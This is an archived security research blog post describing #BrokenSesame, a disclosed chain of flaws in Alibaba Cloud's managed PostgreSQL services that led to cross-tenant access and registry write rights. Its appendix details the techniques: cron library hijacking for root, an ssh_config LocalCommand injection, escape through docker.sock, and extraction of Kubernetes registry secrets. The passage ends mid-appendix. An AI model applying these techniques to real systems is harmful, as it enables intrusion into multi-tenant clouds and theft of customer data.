---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-19_brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-.md
original_filename: 2023-04-19_brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-.md
title: '#BrokenSesame: Accidental ‘write’ permissions to private registry allowed
  potential RCE to Alibaba Cloud Database Services'
category: documents
detected_topics:
- supply-chain
- sso
- command-injection
- cloud-security
- access-control
- xss
tags:
- imported
- documents
- supply-chain
- sso
- command-injection
- cloud-security
- access-control
- xss
language: en
raw_sha256: 48cda0a98bcab56d42cc9a492e5ebe3d48475a595673dd52156d2f536adb906f
text_sha256: 2d19061aadcd64f92a8474506c29f24f82cde680acfed66103fcf8e73bf879bd
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# #BrokenSesame: Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-19_brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-.md
- Source Type: markdown
- Detected Topics: supply-chain, sso, command-injection, cloud-security, access-control, xss
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `48cda0a98bcab56d42cc9a492e5ebe3d48475a595673dd52156d2f536adb906f`
- Text SHA256: `2d19061aadcd64f92a8474506c29f24f82cde680acfed66103fcf8e73bf879bd`


## Content

---
title: "#BrokenSesame: Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services"
page_title: "#BrokenSesame: Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services | Wiz Blog"
url: "https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r"
final_url: "https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r"
authors: ["Ronen Shustin (@ronenshh)", "Shir Tamari (@shirtamari)"]
programs: ["Alibaba"]
bugs: ["Cloud", "RCE", "Container escape", "Kubernetes", "Privilege escalation", "Lateral movement", "Supply chain attack", "Cross-tenant vulnerability"]
publication_date: "2023-04-19"
added_date: "2023-04-24"
source: "pentester.land/writeups.json"
original_index: 1250
---

## 

TL;DR 

Wiz Research has discovered a chain of critical vulnerabilities in two of Alibaba Cloud’s popular services, ApsaraDB RDS for PostgreSQL and AnalyticDB for PostgreSQL. Dubbed #BrokenSesame, the vulnerabilities potentially allowed unauthorized access to Alibaba Cloud customers’ PostgreSQL databases and the ability to perform a supply-chain attack on both Alibaba database services, **leading to an RCE on Alibaba database services**. 

This research demonstrates two critical risks every security team should be aware of: 

  1. The risk of inadequate isolation in multi-tenant applications – Leveraging a few insecure behaviors at the container level we were able to escape to the K8s node and gain high privileges within the K8s cluster. This in turn allowed us to access other tenants’ databases, potentially compromising all the users of a service. 

  2. The risk of improperly scoped write permissions to container registries - Once we compromised the K8s node, we examined the permissions of the configured credentials used to pull images from the Alibaba Cloud private container registry. Due to a critical misconfiguration, the credentials also had write permissions to the registry. This meant that we had the ability to overwrite container images in the central image registry used by Alibaba Cloud and potentially carry out a large-scale supply-chain attack on Alibaba Cloud database services. 

In this blog we review the attack flow in detail, and review recommendations for security teams to prevent similar risks. 

Wiz Research responsibly disclosed #BrokenSesame to Alibaba Cloud in December 2022. Alibaba Cloud confirmed that the issues have been fully mitigated; no customer data was compromised, and no action is required by customers.

## 

Intro 

As part of our efforts to uncover cloud isolation issues, we took a deep dive into two of Alibaba's popular cloud services: ApsaraDB RDS for PostgreSQL and AnalyticDB for PostgreSQL. ApsaraDB RDS is a managed database hosting service with automated monitoring, backup, and disaster recovery capabilities. Meanwhile, AnalyticDB for PostgreSQL is a managed data warehousing service. 

As in every cloud isolation research we conduct, the goal is to identify how attackers could bypass the security boundaries cloud providers put in place and gain access to other customers’ data, a significant issue that affects many managed service providers. 

Our previous research, most notably [_ExtraReplica_](https://www.wiz.io/blog/wiz-research-discovers-extrareplica-cross-account-database-vulnerability-in-azure-postgresql) and [_Hell's Keychain_](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), began by exploiting PostgreSQL vulnerabilities found across multiple cloud providers. In this research, we similarly discovered that both ApsaraDB RDS and AnalyticDB were vulnerable to similar PostgreSQL vulnerabilities and were also multi-tenant services, making them an ideal target for our research. 

However, this blog will not focus on PostgreSQL vulnerabilities themselves but rather on the isolation issues we found in both services.

## 

Multitenancy in Kubernetes

When we perform cloud isolation research, we sometimes want to perform [lateral movement](https://www.wiz.io/academy/what-is-lateral-movement) in the service infrastructure itself to achieve greater impact. This gives us the unique opportunity to examine how these services work from the inside. Throughout our research across cloud providers, we noticed that many cloud providers utilize an orchestrator when creating multi-tenant managed services. Since managing these large-scale environments can be difficult, vendors like Alibaba Cloud use Kubernetes for multitenancy as it simplifies the management and maintenance process. 

However, successfully implementing multitenancy requires cloud providers to effectively isolate the resources of each tenant, which is no simple task since all resources are somehow interconnected. Any misconfiguration such as network connectivity between containers, improper permissions management, or imperfect container isolation, could provide unauthorized access to other tenants’ resources. 

Our findings in these studies illustrate practical security concerns that organizations should be aware of when using Kubernetes.

## 

The attack flow 

In the following section, we will provide a concise overview of the attack flow. For comprehensive technical information, please refer to the appendix located at the end of this blog post. 

We began our research by executing code on our database instance using past PostgreSQL vulnerabilities we have discovered. We then realized that our container was running within a K8s environment. In this kind of environment, we usually try to leverage the K8s API server to obtain information about the cluster and perform actions in it. Unfortunately, our container didn’t have direct network access to the K8s API server. This forced us to focus our research on the following steps: 

  * Elevating our privileges inside the container and/or performing lateral movement to a container with more capabilities. 

  * Escaping to the underlying host (K8s node) to gain access to the K8s API server. 

This is exactly what we did.

### 

AnalyticDB for PostgreSQL 

  1. We exploited a privilege escalation vulnerability in a cronjob task to elevate our privileges to root within the container. 

  2. As we were still limited in our capabilities, we performed lateral movement to a privileged neighboring container in our pod by exploiting a [_shared PID namespace_](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/%22%20/l%20%22understanding-process-namespace-sharing), enabling us to escape to the underlying host (K8s node). 

  3. Once on the node, we leveraged the powerful [_kubelet_](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) credentials to access sensitive resources including secrets, service accounts, and pods. 

  4. When examining the pod list, we found pods belonging to other tenants in the same cluster. This indicated that Alibaba Cloud utilized this cluster for multitenancy purposes, meaning we could potentially gain cross-tenant access to these pods. 

  5. Since Alibaba Cloud utilized a private container image repository, we obtained the necessary credentials to access it and consequently examined their permissions. 

  6. **Upon testing the credentials against the container image registry, we discovered that we not only had read access but also had write permissions**. This meant that we had the ability to overwrite container images and potentially carry out a supply-chain attack on the entire service and other services’ images.

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgFCgoFBQwFBQUFBREJCgUMFxMZGBYTFhUaHysjGh0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLBQUFEAUFEC8cFhwvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAA4AGAMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAAB//EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAWAQADAAAAAAAAAAAAAAAAAAAABAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCWALRMAAf/2Q==)

### 

ApsaraDB RDS for PostgreSQL

  1. We exploited a vulnerability that enabled us to access the source code of a neighboring management container within our pod. 

  2. During our source code audit of the management container, we found a remote code execution (RCE) vulnerability that we leveraged on the neighboring container. We later discovered that this container was privileged, enabling us to escape to the host (K8s node). 

  3. Following a basic reconnaissance of the node, we learned that Alibaba Cloud once again used a multi-tenant cluster. **We subsequently uncovered databases belonging to other tenants on our node, potentially providing us access to their data.**

  4. The private container registry repository used for this service was the same one used for AnalyticDB, meaning we could potentially carry out a supply-chain attack on ApsaraDB RDS using the credentials from AnalyticDB! 

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgFCgoFBQwFBQUFBREJCgUMFxMZGBYTFhUaHysjGh0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLBQUFEAUFEC8cFhwvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAA4AGAMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAAB//EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAWAQADAAAAAAAAAAAAAAAAAAAABAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCVAKxQAAf/2Q==)

## 

Lessons for security teams 

This research defines several fundamental mistakes that allowed us to carry out these attacks; these pitfalls were similar to those found in other cross-tenant research. Drawing on this case, as well as our previous experience with Kubernetes multi-tenant environments from our Hell's Keychain research, we are now able to pinpoint these core issues and offer more insights to those building such services. 

**Isolation between Linux containers**

When designing services with multiple containers, it is crucial to be precise in determining how they should work together—if at all—and what the security implications of such interaction might be. In both ApsaraDB RDS and AnalyticDB our database container shared different Linux namespaces with other operational containers in the K8s pod. Specifically, they shared the PID namespace, which allowed our container to access other processes in the operational containers and the filesystem. This mistake was fatal: it enabled us to perform lateral movement to the operational containers and therefore escape our container! 

**Linux containers as a security barrier**

In the ApsaraDB RDS case study, the Linux container was the only security barrier separating customer databases since the K8s node was hosting several customers’ databases (which is not ideal). If an adversary had managed to perform a container escape, they could have accessed other customers' data. Linux containers are a legitimate, albeit insufficient, security barrier. Service builders should consider using projects like Gvisor or Kata containers to hinder escape. Alibaba Cloud's solution was to use its internal container-hardening solution. 

**Over-permissive identities**

In both ApsaraDB RDS and AnalyticDB, the kubelet service account was over-privileged and could access other tenants’ resources since the K8s cluster was multi-tenant. Scoping kubelet permissions is critical to limiting adversary access, especially if they have escaped their dedicated container instance. In response to our report, Alibaba Cloud scoped kubelet permissions to the bare minimum to better isolate the node from other resources. 

**Non-scoped container registry credentials**

Cloud providers tend to use their own private container registry to host container images in K8s environments. To be able to do so, registry credentials have to be accessible to the K8s node so it can pull the necessary images. In the case of ApsaraDB RDS and AnalyticDB, Alibaba Cloud also utilized its own container registry. However, we found that the credentials used to pull images were not scoped correctly and allowed push permissions, laying the foundation for a supply-chain attack. Alibaba Cloud’s solution was to scope the registry user permissions to pull operations only. 

**Environmental hygiene issues and improper secret management**

The K8s node’s base image in the AnalyticDB service contained sensitive secrets left over from the build process. This hygiene issue is critical to tenant isolation: a single secrets leak could enable an attacker to compromise internal service resources and perform lateral movement within the service cloud environment. Alibaba Cloud not only deleted all the secrets on the node, but also rotated all secrets and restricted their permissions. 

## 

Conclusions 

With this research, we demonstrated how vulnerability exploitation in AnalyticDB for PostgreSQL and ApsaraDB RDS for PostgreSQL could result in unauthorized cross-tenant access to customers’ PostgreSQL databases and a supply-chain attack. Conducted from an adversary’s viewpoint, this research provides a unique perspective and emphasizes the significance of tenant isolation as a vital component of managed services and the cloud at large. We hope that similar research in the future will increase awareness of these concerns and, in the long run, aid cloud builders in creating a more secure cloud environment. 

## 

PEACH framework 

In the past year, Wiz worked on a project called [_PEACH_](https://www.peach.wiz.io/) _._ PEACH is a step-by-step framework for modeling and improving SaaS and PaaS tenant isolation by managing the attack surface exposed by user interfaces. Whether you're a cloud customer or a cloud application developer, PEACH makes it easier to understand how multi-tenant applications should be secured in the cloud. 

## 

Responsible Disclosure 

We disclosed the vulnerabilities to Alibaba Cloud in December 2022. Alibaba Cloud promptly investigated and addressed the issue by implementing new mitigations. The Alibaba Cloud security team told us it had identified and monitored our activity at the time, immediately took relevant actions to minimize risk, and found no evidence to suggest Alibaba Cloud systems or services were exploited by other parties. Log analysis also indicated that all relevant activity was associated with our researchers. 

We commend Alibaba Cloud for their cooperation and responsiveness in handling our report. Their professional conduct and open communication throughout the disclosure process serve as an exemplary model for other vendors.

## 

Disclosure Timeline 

01/11/2022 – Wiz Research started the Alibaba Cloud research.  
12/11/2022 – Alibaba Cloud fixed one of the PostgreSQL vulnerabilities.  
04/12/2022 – Wiz reported to Alibaba Cloud the vulnerabilities that affected ApsaraDB RDS for PostgreSQL and AnalyticDB for PostgreSQL.  
05/12/2022 – The Alibaba Cloud security team replied that they were monitoring our activities during the research, and had taken a proactive approach and had already fixed some of the vulnerabilities.  
08/12/2022 – Wiz and the Alibaba Cloud security team discussed mitigation ideas for the vulnerabilities yet to be fixed.  
24/02/2023 – The Alibaba Cloud security team shared with Wiz test instances to validate the fixes.  
12/04/2023 – Alibaba Cloud deployed all the mitigations.

## 

Stay in touch! 

Hi there! We are Shir Tamari (@shirtamari), Nir Ohfeld (@nirohfeld), Sagi Tzadik (@sagitz_), Ronen Shustin (@ronenshh) and Hillai Ben-Sasson (@hillai) from the Wiz Research Team (@wiz_io). We are a group of veteran white-hat hackers with a single goal: to make the cloud a safer place for everyone. We primarily focus on finding new attack vectors in the cloud and uncovering isolation issues in cloud vendors. We would love to hear from you! Feel free to contact us on Twitter or via email: [_research@wiz.io_](mailto:research@wiz.io). 

Or sign up to receive our monthly research [_newsletter_](https://cryingoutcloud.glide.page/dl/6471c6). 

## 

APPENDIX: Technical details 

The next section describes the technical details in chronological order. You are welcome to use the table of contents on the left to browse through the different stages. 

### 

AnalyticDB for PostgreSQL 

#### Privilege Escalation 

We began by exploring ways to escalate our privileges to root within the database container. During our initial reconnaissance, we discovered a cronjob task that ran the binary `_/usr/bin/tsar_` every minute with root permissions.
  
  
  $: ls -lah /etc/cron.d/tsar 
  -rw-r--r-- 1 root root 99 Apr 19  2021 /etc/cron.d/tsar 
  
  $: cat /etc/cron.d/tsar 
  
  # cron tsar collect once per minute 
  MAILTO="" 
  * * * * * root /usr/bin/tsar --cron > /dev/null 2>&1

Performing the `_ldd_` command on the binary disclosed it loaded shared libraries from a custom location, the `/u01` directory which was writable for the `adbpgadmin `user.

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgNCgoODhYVDA0NGh0SChUSFxUdGBYVFhUdHysjGh0oHRYWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDg0OHBAQHDsoIhwvLy8vLzs7Oy8vLy8vLy8vLy8vLy87Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAAYAGAMBIgACEQEDEQH/xAAYAAEAAwEAAAAAAAAAAAAAAAAAAwQGAf/EABsQAAICAwEAAAAAAAAAAAAAAAABAgQDESIU/8QAFwEAAwEAAAAAAAAAAAAAAAAAAgMEAf/EABkRAAMAAwAAAAAAAAAAAAAAAAABAhIhUf/aAAwDAQACEQMRAD8Ay2Oo3HqeyHx43JnQNjYVykUbFFKfMtAA3FcJz//Z)

We listed the owner of `_libgcc_s.so.1_` and found that it was owned by our user `adbpgadmin` and could be overwritten!
  
  
  $: ls -alh /u01/adbpg/lib/libgcc_s.so.1 
  -rwxr-xr-x 1 adbpgadmin adbpgadmin 102K Oct 27 12:22 /u01/adbpg/lib/libgcc_s.so.1 

This meant that if we could overwrite this file with our own shared library, our library's code would get executed as root the next time the cronjob task executes the binary file! 

To exploit this behavior, we followed these steps: 

  1. Compiled a shared library which copied `/bin/bash` to `/bin/dash` and made it a SUID so we could execute code as root. 

  2. Utilized the [_PatchELF_](https://github.com/NixOS/patchelf) utility to add a dependency to the `_libgcc_s.so.1_` library. That way when it was loaded, our own library would be loaded as well. 

  3. Overwrote the original `libgcc_s.so.1` library. 

  4. Waited for `/usr/bin/tsar` to get executed. 

Our strategy ultimately succeeded, granting us root access. 

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoQCAgFChYODhgVDg0NDh0VERUNFxMeGBYTFhUmKyslGh0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDg0OHAUOHDsdFhwvLy8vLy87Oy8vLy8vLy8vLy8vLy87Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAAIAGAMBIgACEQEDEQH/xAAXAAEAAwAAAAAAAAAAAAAAAAAAAgUG/8QAGxAAAgMBAQEAAAAAAAAAAAAAAQMAAgQhcZL/xAAWAQADAAAAAAAAAAAAAAAAAAAAAQP/xAAWEQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhEDEQA/AM+9CjTqkH2olW/NnB4jN8CIiK2Ap0zZ7L6jMfaCIiEIX//Z)

#### Container escape to the host (K8s node) 

Although we successfully escalated our privileges, we were lacking the capabilities to perform a container escape. 

Over this past year of investigating multiple CSPs' managed services, we found that actions performed by customers from the management portal often led to the creation of various containers and processes in the managed environment, potentially expanding the attack surface for lateral movement. 

By invoking certain operations in the Alibaba Cloud portal (such as enabling SSL encryption), we observed the spawn of multiple processes like SCP and SSH.

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgFCgoFBQwFBQUFBREJCgUMFxMZGBYTFhUaHysjGh0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLBQUFEAUFEC8cFhwvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAAgAGAMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAAB//EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAVAQEBAAAAAAAAAAAAAAAAAAACAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/ALEAJACT/9k=)

Option to enable/disable SSL encryption
  
  
  # Command lines of the spawned processes
  su - adbpgadmin -c scp /home/adbpgadmin/xxx_ssl_files/* 
  *REDACTED*:/home/adbpgadmin/data/master/seg-1/ 
  
  /usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes 
  -- *REDACTED* scp -d -t /home/adbpgadmin/data/master/seg-1/ 

Some of the spawned processes contained paths in their command line that didn’t exist in our container. We inferred that the processes were being spawned in a different container that [_shared the PID namespace_](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/#understanding-process-namespace-sharing) with our container. To verify this theory, we wrote a Python script that waited for the SCP process to spawn (because it ran with our user, `adbpgadmin`) and then accessed its filesystem using the path `_/proc/{pid}/root/:_`
  
  
  # The Python script we used to access the second container filesystem
  import psutil 
  import os 
  listed = set() 
  while True: 
      for proc in psutil.process_iter(): 
          try: 
              processName = proc.name() 
              processID = proc.pid 
              cmdLine = proc.cmdline() 
              if processID not in listed and processName == 'scp': 
                  os.system('ls -alh /proc/{}/root/'.format(processID)) 
  
                  listed.add(processID) 
          except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
          pass 

After re-enabling the SSL action again, the SCP process spawned, and our script let us access its filesystem. We were happy our assumption was correct, and the process was indeed running in a second container. Using this method, we performed more information gathering on the second container and concluded that although both containers were different, their home directories (`/home/adbpgadmin`) were the same mount! 

To execute code in the second container, we came up with an interesting idea. Since the SSH command was executed every time we re-enabled the SSL action and our home directories were shared, we could modify the local SSH client configuration file at `_/home/adbpgadmin/.ssh/config_`. By doing so, we could configure the [_LocalCommand_](https://linux.die.net/man/5/ssh_config) field to execute our own arbitrary commands during the next SSH command execution. 

Here is an example of the SSH client configuration we used:

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgLCgoLDhYRDg0NDh0VFh0VFxMZGBYfIhUmKzcvHR0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDg0OHA0QHDsoFhwvLy8vLzs7OzsvLy8vLy8vLy8vLy87Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAAMAGAMBIgACEQEDEQH/xAAXAAEAAwAAAAAAAAAAAAAAAAAAAQMG/8QAHhAAAQQBBQAAAAAAAAAAAAAAAAECAwQFESFhcYL/xAAWAQEBAQAAAAAAAAAAAAAAAAADBAL/xAAYEQADAQEAAAAAAAAAAAAAAAAAAQIRUf/aAAwDAQACEQMRAD8Ax2Fq17e88EcnbUJyOMpNsaNrtROCAHrLqmeFTsZTa3VIET0oANaA0j//2Q==)

The SSH client configuration which executes the “status.sh” script

After we overwrote the SSH client configuration, we invoked the SSL action again via the Alibaba Cloud portal. We observed the spawn of the SSH process, and our commands were executed as the `_adbpgadmin_` user in the second container! 

We then copied our SUID binary to the shared home directory so we would be able to execute code as root in the second container.

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgLCgoWDhYVDg0NDh0VFh0NFyUZGBYTFhgmKysjGh0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDg0OHA4QHDseIhw7Ly8vLzU7Oy8vLy8vLzUvLy8vLy87Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAAMAGAMBIgACEQEDEQH/xAAWAAEBAQAAAAAAAAAAAAAAAAAABAb/xAAeEAACAgAHAAAAAAAAAAAAAAAAAQIDBBETITNykv/EABYBAQEBAAAAAAAAAAAAAAAAAAQFA//EABgRAAMBAQAAAAAAAAAAAAAAAAABAhEh/9oADAMBAAIRAxEAPwDK4OEVQ9iHGU1NtuuGfUAOmyhUrCeVdenxw8oAGug6XT//2Q==)

New SSH client configuration which uses the SUID binary to execute code as root in the second container

After successfully performing lateral movement to the second container, what could we accomplish from this new position? 

Upon examining the capabilities of the second container, we realized that it was privileged. Additionally, we found that the Docker Unix socket (`_/run/docker.sock_`) was accessible from the container, a known element used in container-escape techniques. 

Given the second container was only temporarily created for the operation (Enabling SSL encryption), we utilized the exposed Docker Unix socket to run a new persistent, privileged container. This container would share the same PID, IPC, UTS, NET, USER, and MOUNT namespaces as the host machine (K8s node) with the host root directory mounted at `/mnt`. It would continue to exist indefinitely and receive commands from our unprivileged container through shared pipes located at `/home/adbpgadmin`. 

Spawning the new “super” container enabled us to escape to the host (K8s node) and finally reach the K8s API since we now shared the same network namespace. We were also able to avoid using the shared named pipes by invoking a [reverse shell ](https://www.wiz.io/academy/reverse-shell-attacks)as the host permitted outbound connections to the internet. This was a significant achievement in the research! 

For further information on utilizing the `docker.sock` API, please refer to this [_guide_](https://docs.docker.com/engine/api/v1.40/).
  
  
  # Code execution inside the new privileged container 
  $: echo ‘id’ > /home/adbpgadmin/i_pipe; timeout 1 cat /home/adbpgadmin/o_pipe 
  uid=0(root) gid=0(root) groups=10(wheel) 
  
  # Accessing the host filesystem from the new privileged container
  $: echo ‘ls -alh /mnt’ > /home/adbpgadmin/i_pipe; timeout 2 cat /home/adbpgadmin/o_pipe 
  total 88 
  dr-xr-xr-x   23 root     root        4.0K Nov  6 10:07 . 
  drwxr-xr-x    1 root     root        4.0K Nov  7 15:54 .. 
  drwxr-x---    4 root     root        4.0K Nov  6 10:07 .kube 
  lrwxrwxrwx    1 root     root           7 Aug 29  2019 bin -> usr/bin 
  dr-xr-xr-x    5 root     root        4.0K Nov  2 10:21 boot 
  drwxr-xr-x   17 root     root        3.1K Nov  6 10:08 dev 
  drwxr-xr-x   84 root     root        4.0K Nov  6 10:08 etc 
  drwxr-xr-x    3 root     root        4.0K Nov  2 10:24 flash 
  drwxr-xr-x    6 root     root        4.0K Nov  6 10:11 home 
  drwxr-xr-x    2 root     root        4.0K Nov  2 10:24 lafite 
  lrwxrwxrwx    1 root     root           7 Aug 29  2019 lib -> usr/lib 
  lrwxrwxrwx    1 root     root           9 Aug 29  2019 lib64 -> usr/lib64 
  drwx------    2 root     root       16.0K Aug 29  2019 lost+found 
  drwxr-xr-x    2 root     root        4.0K Dec  7  2018 media 
  drwxr-xr-x    3 root     root        4.0K Nov  6 10:07 mnt 
  drwxr-xr-x   11 root     root        4.0K Nov  6 10:07 opt 
  dr-xr-xr-x  184 root     root           0 Nov  6 10:06 proc 
  dr-xr-x---   10 root     root        4.0K Nov  6 10:07 root 

#### From K8s lateral movement to supply-chain attack 

With access to the K8s API server, we utilized the node’s [_kubelet_](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) credentials to examine various cluster resources, including secrets, service accounts, and pods. When examining the pod list, we found pods belonging to other tenants in the same cluster. This indicated that Alibaba Cloud designed the cluster for multitenancy, meaning we could potentially gain cross-tenant access to these pods.
  
  
  # Listing the pods inside the K8s cluster
  $: /tmp/kubectl get pods 
  NAME                                                                       READY   STATUS      RESTARTS   AGE 
  gp-4xo3*REDACTED*-master-100333536                                      1/1     Running     0          5d1h 
  gp-4xo3*REDACTED*-master-100333537                                      1/1     Running     0          5d1h 
  gp-4xo3*REDACTED*-segment-100333538                                     1/1     Running     0          5d1h 
  gp-4xo3*REDACTED*-segment-100333539                                     1/1     Running     0          5d1h 
  gp-4xo3*REDACTED*-segment-100333540                                     1/1     Running     0          5d1h 
  gp-4xo3*REDACTED*-segment-100333541                                     1/1     Running     0          5d1h 
  gp-gw87*REDACTED*-master-100292154                                      1/1     Running     0          175d 
  gp-gw87*REDACTED*-master-100292155                                      1/1     Running     0          175d 
  gp-gw87*REDACTED*-segment-100292156                                     1/1     Running     0          175d 
  gp-gw87*REDACTED*-segment-100292157                                     1/1     Running     0          175d 
  gp-gw87*REDACTED*-segment-100292158                                     1/1     Running     0          175d 
  gp-gw87*REDACTED*-segment-100292159                                     1/1     Running     0          175d 
  ... 

We also decided to investigate the container registry secrets since Alibaba Cloud used their private repository to host K8s container images.
  
  
  # A snippet of the pods configuration, illustrating the use of a private container registry 
  
  "spec": { 
      "containers": [ 
          { 
              "image": "*REDACTED*.eu-central-1.aliyuncs.com/apsaradb_*REDACTED*/*REDACTED*", 
              "imagePullPolicy": "IfNotPresent", 
  ...            
      "imagePullSecrets": [ 
          { 
              "name": "docker-image-secret" 
          } 
      ], 

In order to use a private container registry in K8s the credentials for it need to be supplied via the [_imagePullSecret_](https://kubernetes.io/docs/concepts/containers/images/#specifying-imagepullsecrets-on-a-pod) field in the configuration. 

Extracting this secret allowed us to access these credentials and test them against the container registry! 
  
  
  # Retrieving the container registry secret
  $: /tmp/kubectl get secret -o json docker-image-secret 
  { 
      "apiVersion": "v1", 
      "data": { 
          ".dockerconfigjson": "eyJhdXRoc*REDACTED*" 
      }, 
      "kind": "Secret", 
      "metadata": { 
          "creationTimestamp": "2020-11-12T14:57:36Z", 
          "name": "docker-image-secret", 
          "namespace": "default", 
          "resourceVersion": "2705", 
          "selfLink": "/api/v1/namespaces/default/secrets/docker-image-secret", 
          "uid": "6cb90d8b-1557-467a-b398-ab988db27908" 
      }, 
      "type": "kubernetes.io/dockerconfigjson" 
  } 
  
  # Redacted decoded credentials
  { 
      "auths": { 
          "registry-vpc.eu-central-1.aliyuncs.com": { 
              "auth": "*REDACTED*", 
              "password": "*REDACTED*", 
              "username": "apsaradb*REDACTED*" 
          } 
      } 
  } 

Upon testing the credentials against the container image registry**, we discovered that we not only had read access but also had write permissions**. This meant that we had the ability to overwrite container images and potentially carry out a supply-chain attack on the entire service and other services’ images. 

For example, we could overwrite the `rds_postgres_*REDACTED*` image that belongs to another service.

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBhYPCAgLFg4ODg8NDQ0NFRYNFhENFxoZGCITFhUaHysjGh0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDggOHAUQHDscFhwvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAAkAGAMBIgACEQEDEQH/xAAYAAACAwAAAAAAAAAAAAAAAAADBAACBv/EAB8QAAECBgMAAAAAAAAAAAAAAAABBAURITFBQgIDFf/EABUBAQEAAAAAAAAAAAAAAAAAAAMB/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAERAv/aAAwDAQACEQMRAD8AxPZEHC8KIKrEHU6IMaAckESUK+g7lYgTBCAalP/Z)

Demonstrating the ability to push images to other services 

#### Environmental hygiene issues 

As with all research we conduct, we tried to perform a secret scan on the filesystem to see whether we could retrieve any access keys, private keys, etc. given poor environmental hygiene can induce a more devastating attack. The secret scan on the node revealed multiple access keys in various log files, including the `.bash_history` file. 
  
  
  /etc/*REDACTED*/custins/400480085/100333829/custins_job:LTAIALrh*REDACTED*gi 
  /opt/*REDACTED*/golang_extern_backend_sls.conf:LTAI4Fo*REDACTED*5kJ 
  /root/.bash_history:LTAI4FrP*REDACTED*NTqkX 
  /var/lib/*REDACTED*/data/errors-1182678.txt:LTAI4G4*REDACTED*Ujw3y 
  /var/lib/docker/containers/1085d3b04fed29011705ca6d277525bbde342dbc036a605b6ecb74531b708543/config.v2.json:LTAI4Fdepc*REDACTED*v1R 

### 

ApsaraDB RDS for PostgreSQL 

Following our research on AnalyticDB, we aimed to replicate its impact with the ApsaraDB RDS service. Reconnaissance of our ApsaraDB RDS PostgreSQL instance container revealed a different environment from AnalyticDB. Therefore, we needed to find new vulnerabilities to escape the container and gain access to the underlying host.
  
  
  $: id 
  uid=1000(alicloud_rds_admin) gid=1000(alicloud_rds_admin) groups=1000(alicloud_rds_admin) 

#### File disclosure primitive 

While browsing the files in our database container, we stumbled upon the `_/tmp/tools_log_` directory. It contained a strange file:
  
  
  $: ls -alh /tmp/tools_log 
  total 2.4M 
  drwxrwxrwx 2 root root 4.0K Nov 10 08:55 . 
  drwxrwxrwx 5 root root 4.0K Nov 16 23:07 .. 
  -rwxrwxrwx 1 root root 2.4M Nov 16 23:07 docker_tools.log

